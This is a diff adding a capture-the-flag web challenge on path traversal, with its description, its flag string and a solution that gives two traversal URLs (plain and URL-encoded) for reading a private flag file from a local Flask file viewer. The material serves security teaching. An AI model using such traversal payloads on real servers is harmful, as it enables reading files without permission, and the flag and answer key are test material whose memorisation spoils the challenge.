@@ -1,0 +1,26 @@
+# Challenge 14: Path Traversal
+# Category: Web
+# Points: 350
+# Difficulty: Medium
+
+## Description
+This file viewer lets you read files from the server. But can you read files you're not supposed to access?
+
+[Host the Flask app]
+
+## Flag
+flag{path_traversal_reads_sensitive_files}
+
+## Solution
+Use path traversal (../) to access files outside the intended directory:
+
+```
+http://localhost:5004?file=../private/flag.txt
+```
+
+Or URL encoded:
+```
+http://localhost:5004?file=..%2Fprivate%2Fflag.txt
+```
+
+The server incorrectly sanitizes the path, allowing access to files outside the `files/` directory.
